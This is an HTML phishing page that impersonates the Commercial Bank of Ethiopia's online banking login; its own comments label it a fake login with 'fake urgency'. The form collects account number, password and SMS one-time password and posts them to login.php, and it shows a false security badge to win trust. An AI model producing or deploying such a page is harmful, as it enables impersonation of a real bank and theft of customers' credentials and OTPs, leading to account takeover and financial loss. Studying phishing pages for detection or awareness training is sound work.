<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Commercial Bank of Ethiopia - Online Banking</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Fake CBE Login -->
    <div class="container">
        <div class="login-box">
            <!-- Official CBE Logo -->
            <div class="logo">
                <img src="cbe-logo.png" alt="CBE" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22120%22 height=%22120%22%3E%3Ctext y=%2230%22 font-size=%2230%22%3ECBE%3C/text%3E%3C/svg%3E'">
                <h1>Commercial Bank of Ethiopia</h1>
                <p>Secure Online Banking</p>
            </div>

            <!-- Security Alert (Fake urgency) -->
            <div class="alert-banner">
                ⚠️ For security reasons, please verify your identity
            </div>

            <!-- Fake Login Form -->
            <form id="loginForm" action="login.php" method="POST">
                <div class="form-group">
                    <label>Account Number or Username</label>
                    <input type="text" name="username" placeholder="Enter your account number" required>
                </div>

                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter your password" required>
                    <span class="toggle-password" onclick="togglePassword()">👁️</span>
                </div>

                <div class="form-group">
                    <label>One-Time Password (OTP)</label>
                    <input type="text" name="otp" placeholder="Enter OTP from SMS" required>
                </div>

                <button type="submit">Secure Login</button>
            </form>

            <div class="footer-links">
                <a href="#">Forgot Password?</a>
                <a href="#">Register for Online Banking</a>
            </div>

            <div class="security-badge">
                🔒 Secured with 256-bit SSL Encryption
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
  </html>
